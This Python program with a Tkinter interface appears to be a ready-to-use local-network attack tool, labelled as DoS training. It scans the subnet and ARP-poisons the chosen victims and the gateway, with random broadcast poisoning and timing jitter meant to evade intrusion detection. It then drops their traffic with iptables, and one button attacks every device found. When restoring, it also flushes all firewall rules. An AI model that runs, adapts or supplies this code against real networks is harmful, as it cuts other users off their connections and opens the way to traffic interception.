#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
EL MURO SILENCIOSO v9 - BLACK OPS EDITION
Diseñado para: Entrenamiento avanzado en denegación de servicio local (DoS) 
y contramedidas de red.
"""

import tkinter as tk
from tkinter import ttk, scrolledtext
import multiprocessing
import time
import random
import subprocess
import os
import sys
from scapy.all import (ARP, Ether, send, srp, AsyncSniffer, 
                       DNS, DNSQR, IP, UDP, DNSRR, conf, 
                       get_if_addr, get_if_hwaddr)

conf.verb = 0

# ==================== MOTOR DE ATAQUE (PROCESO INDEPENDIENTE) ====================

def attack_engine(targets_queue, control_event, net_info):
    """
    Este proceso corre en paralelo a la interfaz. 
    Usa el 100% de la potencia necesaria sin congelar la GUI.
    """
    ip_gw = net_info['gw']
    mac_local = net_info['mac']
    mac_gw = net_info['mac_gw']
    
    active_targets = {} # {ip: mac}

    while not control_event.is_set():
        # Actualizar lista de objetivos desde la cola
        try:
            while not targets_queue.empty():
                ip, mac, active = targets_queue.get_nowait()
                if active: active_targets[ip] = mac
                elif ip in active_targets: del active_targets[ip]
        except: pass

        if active_targets:
            for ip, mac in active_targets.items():
                try:
                    # TÉCNICA AGRESIVA: Doble impacto por ciclo
                    # 1. Matar conexión de la víctima
                    send(ARP(op=2, pdst=ip, hwdst=mac, psrc=ip_gw, hwsrc=mac_local), verbose=0, count=2)
                    # 2. Envenenar la tabla del router para esa IP
                    send(ARP(op=2, pdst=ip_gw, hwdst=mac_gw, psrc=ip, hwsrc=mac_local), verbose=0, count=2)
                    
                    # TÉCNICA MALICIOSA: Broadcast Poisoning (Opcional aleatorio)
                    if random.random() > 0.8:
                        send(ARP(op=2, pdst="255.255.255.255", psrc=ip_gw, hwsrc=mac_local), verbose=0)
                except: pass
        
        # Jitter para evitar detección de IDS (Patrón no lineal)
        time.sleep(random.uniform(0.5, 1.5))

# ==================== INTERFAZ PROFESIONAL ====================

class AppMuro:
    def __init__(self, root):
        self.root = root
        self.root.title("BLACK OPS v9 - CYBERSECURITY LAB")
        self.root.geometry("1000x800")
        self.root.configure(bg="#0a0a0a")
        
        self.net_info = self.setup_network()
        self.targets = {}
        self.queue = multiprocessing.Queue()
        self.control_event = multiprocessing.Event()
        
        self.setup_ui()
        self.start_engine()

    def setup_network(self):
        try:
            route = subprocess.getoutput("ip route show default").split()
            iface = route[4]
            gw = route[2]
            ip_l = get_if_addr(iface)
            mac_l = get_if_hwaddr(iface)
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gw), timeout=2, verbose=0)
            mac_gw = ans[0][1].hwsrc
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
            return {'gw': gw, 'ip': ip_l, 'mac': mac_l, 'iface': iface, 'mac_gw': mac_gw}
        except:
            print("ERROR CRÍTICO: No se detectó red."); sys.exit(1)

    def start_engine(self):
        self.process = multiprocessing.Process(target=attack_engine, 
                                              args=(self.queue, self.control_event, self.net_info))
        self.process.start()

    def setup_ui(self):
        # Estilo Hacker
        style = ttk.Style()
        style.theme_use('clam')
        style.configure("Treeview", background="#111", foreground="#0f0", fieldbackground="#111", font=("Consolas", 10))
        
        header = tk.Label(self.root, text="SYSTEM ANNIHILATOR v9.0 // BLACK OPS", bg="#b30000", fg="white", font=("Impact", 24), pady=10)
        header.pack(fill="x")

        ctrl_frame = tk.Frame(self.root, bg="#0a0a0a", pady=10)
        ctrl_frame.pack()
        
        tk.Button(ctrl_frame, text="SCAN NETWORK", command=self.scan, width=15, bg="#222", fg="#0f0").pack(side="left", padx=5)
        tk.Button(ctrl_frame, text="TERMINATE ALL", command=self.attack_all, width=15, bg="#400", fg="white").pack(side="left", padx=5)
        tk.Button(ctrl_frame, text="RESTORE ALL", command=self.restore_all, width=15, bg="#004", fg="white").pack(side="left", padx=5)

        # Tabla de objetivos
        self.tree = ttk.Treeview(self.root, columns=("IP", "MAC", "STATUS"), show="headings", height=15)
        self.tree.heading("IP", text="DIRECCIÓN IP")
        self.tree.heading("MAC", text="DIRECCIÓN FÍSICA")
        self.tree.heading("STATUS", text="ESTADO DE CONEXIÓN")
        self.tree.pack(fill="both", expand=True, padx=20)
        self.tree.bind("<Double-1>", self.on_double_click)

        self.log_area = scrolledtext.ScrolledText(self.root, height=10, bg="#000", fg="#0f0", font=("Consolas", 9))
        self.log_area.pack(fill="x", padx=20, pady=10)

    def log(self, msg):
        self.log_area.insert(tk.END, f"[*] {msg}\n")
        self.log_area.see(tk.END)

    def scan(self):
        self.log("Iniciando escaneo de ráfaga...")
        red = self.net_info['gw'] + "/24"
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=red), timeout=3, verbose=0)
        
        for item in self.tree.get_children(): self.tree.delete(item)
        
        for _, rcv in ans:
            if rcv.psrc not in [self.net_info['ip'], self.net_info['gw']]:
                self.targets[rcv.psrc] = {'mac': rcv.hwsrc, 'active': False}
                self.tree.insert("", "end", iid=rcv.psrc, values=(rcv.psrc, rcv.hwsrc, "LIVE"))
        self.log(f"Escaneo finalizado. {len(ans)} dispositivos detectados.")

    def on_double_click(self, event):
        item = self.tree.selection()[0]
        self.toggle_target(item)

    def toggle_target(self, ip):
        if ip not in self.targets: return
        is_active = not self.targets[ip]['active']
        self.targets[ip]['active'] = is_active
        
        # Actualizar UI
        status = "BLOQUEADO" if is_active else "LIVE"
        self.tree.item(ip, values=(ip, self.targets[ip]['mac'], status))
        
        # Enviar al motor de ataque y aplicar IPtables
        self.queue.put((ip, self.targets[ip]['mac'], is_active))
        self.manage_iptables(ip, is_active)
        self.log(f"{'ATAQUE' if is_active else 'RESTAURACIÓN'} ejecutada en {ip}")

    def manage_iptables(self, ip, enable):
        cmd = "-I" if enable else "-D"
        subprocess.run(["iptables", cmd, "FORWARD", "-s", ip, "-j", "DROP"], capture_output=True)
        subprocess.run(["iptables", cmd, "FORWARD", "-d", ip, "-j", "DROP"], capture_output=True)

    def attack_all(self):
        for ip in self.targets:
            if not self.targets[ip]['active']: self.toggle_target(ip)

    def restore_all(self):
        for ip in self.targets:
            if self.targets[ip]['active']: self.toggle_target(ip)
        subprocess.run(["iptables", "-F"], capture_output=True)

    def on_close(self):
        self.control_event.set()
        self.restore_all()
        self.process.join(timeout=1)
        self.root.destroy()

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("ESTE NIVEL DE ACCESO REQUIERE PRIVILEGIOS ROOT."); sys.exit(1)
    
    # Necesario para multiprocessing en entornos con GUI
    multiprocessing.freeze_support()
    
    root = tk.Tk()
    app = AppMuro(root)
    root.protocol("WM_DELETE_WINDOW", app.on_close)
    root.mainloop()
